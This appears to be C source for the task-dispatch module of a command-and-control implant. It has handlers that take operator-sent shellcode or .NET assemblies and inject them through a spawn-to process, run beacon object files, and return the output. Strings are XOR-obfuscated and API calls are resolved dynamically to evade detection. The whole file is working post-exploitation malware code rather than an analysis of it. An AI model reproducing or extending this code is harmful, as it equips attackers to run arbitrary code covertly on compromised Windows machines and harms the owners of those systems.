#include <winsock2.h>
#include <windows.h>
#include <stdint.h>

#include "task_dispatch.h"
#include "protocol.h"
#include "assembly.h"
#include "bof.h"
#include "obf.h"
#include "obf_strings.h"
#include "dynapi.h"

static uint32_t td_read_u32(const uint8_t *p) {
    return (uint32_t)p[0]
        | ((uint32_t)p[1] << 8)
        | ((uint32_t)p[2] << 16)
        | ((uint32_t)p[3] << 24);
}

static void td_copy_bytes(char *dst, uint32_t dst_len,
                          const uint8_t *src, uint32_t src_len) {
    uint32_t i;
    uint32_t n;
    if (!dst || dst_len == 0) return;
    dst[0] = 0;
    if (!src || src_len == 0) return;
    n = src_len < dst_len - 1 ? src_len : dst_len - 1;
    for (i = 0; i < n; i++) dst[i] = (char)src[i];
    dst[n] = 0;
}

static void td_copy_cstr(char *dst, uint32_t dst_len, const char *src) {
    uint32_t i = 0;
    if (!dst || dst_len == 0) return;
    dst[0] = 0;
    if (!src) return;
    while (i + 1 < dst_len && src[i]) {
        dst[i] = src[i];
        i++;
    }
    dst[i] = 0;
}

static uint32_t td_strlen(const char *src) {
    uint32_t n = 0;
    if (!src) return 0;
    while (src[n]) n++;
    return n;
}

static int td_send_error(uint32_t label,
                         uint8_t type,
                         uint8_t code,
                         const unsigned char *enc,
                         int enc_len,
                         beacon_task_result_fn send_result_fn,
                         void *send_ctx) {
    char msg[96];
    int n = enc_len;
    if (!send_result_fn) return -1;
    if (n < 0) n = 0;
    if (n >= (int)sizeof(msg)) n = (int)sizeof(msg) - 1;
    if (n > 0) xor_dec(msg, enc, n);
    msg[n] = 0;
    return send_result_fn(send_ctx, label, type, code, FLAG_ERROR,
                          msg, td_strlen(msg));
}

int beacon_task_exec_assembly(const uint8_t *task_data,
                              uint32_t task_data_len,
                              uint32_t label,
                              beacon_task_result_fn send_result_fn,
                              void *send_ctx) {
    uint32_t sc_len;
    uint32_t sp_off;
    uint32_t sp_len;
    const uint8_t *sc;
    char spawnto_a[MAX_PATH];
    wchar_t spawnto_w[MAX_PATH];
    char output[EXEC_ASM_MAX_OUTPUT];
    int i;

    if (!send_result_fn) return -1;
    if (!task_data || task_data_len < 8) {
        return td_send_error(label, TASK_EXEC_ASSEMBLY, CODE_EXEC_ASSEMBLY,
                             ENC_EXEC_ASM_ERR_INJECT,
                             ENC_EXEC_ASM_ERR_INJECT_LEN,
                             send_result_fn, send_ctx);
    }

    sc_len = td_read_u32(task_data);
    if (sc_len > task_data_len - 8) {
        return td_send_error(label, TASK_EXEC_ASSEMBLY, CODE_EXEC_ASSEMBLY,
                             ENC_EXEC_ASM_ERR_INJECT,
                             ENC_EXEC_ASM_ERR_INJECT_LEN,
                             send_result_fn, send_ctx);
    }

    sc = task_data + 4;
    sp_off = 4 + sc_len;
    sp_len = td_read_u32(task_data + sp_off);

    if (sp_len > 0 && sp_len < MAX_PATH && sp_off + 4 + sp_len <= task_data_len) {
        td_copy_bytes(spawnto_a, (uint32_t)sizeof(spawnto_a),
                      task_data + sp_off + 4, sp_len);
    } else {
        char def_spawnto[ENC_EXEC_ASM_SPAWNTO_LEN + 1];
        xor_dec(def_spawnto, ENC_EXEC_ASM_SPAWNTO, ENC_EXEC_ASM_SPAWNTO_LEN);
        def_spawnto[ENC_EXEC_ASM_SPAWNTO_LEN] = 0;
        td_copy_cstr(spawnto_a, (uint32_t)sizeof(spawnto_a), def_spawnto);
    }

    for (i = 0; i < MAX_PATH; i++) spawnto_w[i] = 0;
    fnMultiByteToWideChar(65001, 0, spawnto_a, -1, spawnto_w, MAX_PATH);

    output[0] = 0;
    exec_assembly(sc, sc_len, spawnto_w, output, sizeof(output));
    return send_result_fn(send_ctx, label, TASK_EXEC_ASSEMBLY,
                          CODE_EXEC_ASSEMBLY, FLAG_NONE,
                          output, td_strlen(output));
}

int beacon_task_bof(const uint8_t *task_data,
                    uint32_t task_data_len,
                    uint32_t label,
                    beacon_task_result_fn send_result_fn,
                    void *send_ctx) {
    bof_result_t br;
    char empty_out[1];
    char err_out[64];
    const char *out;
    uint32_t out_len;
    int bof_status;
    int rc;

    if (!send_result_fn) return -1;
    empty_out[0] = 0;
    br.exit_code = 0;
    br.output = NULL;
    br.output_len = 0;

    if (!task_data || task_data_len < 8) {
        bof_status_message(-1, err_out, sizeof(err_out));
        return send_result_fn(send_ctx, label, TASK_BOF, CODE_BOF,
                              FLAG_ERROR, err_out, td_strlen(err_out));
    }

    bof_status = bof_execute_packet(task_data, task_data_len, &br);
    out = br.output ? br.output : empty_out;
    out_len = br.output ? br.output_len : 0;
    if (bof_status != 0 && !br.output) {
        bof_status_message(bof_status, err_out, sizeof(err_out));
        out = err_out;
        out_len = td_strlen(err_out);
    }

    rc = send_result_fn(send_ctx, label, TASK_BOF, CODE_BOF,
                        bof_status == 0 ? FLAG_NONE : FLAG_ERROR,
                        out, out_len);
    bof_free_result(&br);
    return rc;
}
